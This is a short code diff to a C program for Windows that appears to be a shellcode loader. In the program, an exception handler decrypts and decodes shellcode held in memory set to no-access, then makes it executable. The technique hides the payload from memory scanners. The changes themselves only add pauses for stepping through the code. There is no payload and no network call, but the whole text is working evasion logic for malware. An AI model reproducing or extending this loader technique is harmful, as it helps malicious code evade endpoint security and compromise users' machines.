@@ -83,9 +83,11 @@ LONG WINAPI handler(EXCEPTION_POINTERS* ExceptionInfo) {
             printf("\n[!] Access violation at %p\n", faultAddr);
             // Decrypt & decode
             VirtualProtect(exec_mem, current_len, PAGE_READWRITE, &old);
+            getchar();
             printf("[*] Decrypting & decoding shellcode...\n");
             aes_decrypt((unsigned char*)exec_mem, current_len);
             base64_decode((unsigned char*)exec_mem, &current_len);
+            getchar();
             VirtualProtect(exec_mem, current_len, PAGE_EXECUTE_READ, &old);
             return EXCEPTION_CONTINUE_EXECUTION;
         }
@@ -137,7 +139,7 @@ int main() {
         // Reprotect shellcode with PAGE_NOACCESS
         printf("[*] Changing protection to PAGE_NOACCESS!\n");
         VirtualProtect(exec_mem, current_len, PAGE_NOACCESS, &old);
-        Sleep(5000);
+        getchar();
     }
 
     VirtualFree(exec_mem, 0, MEM_RELEASE);
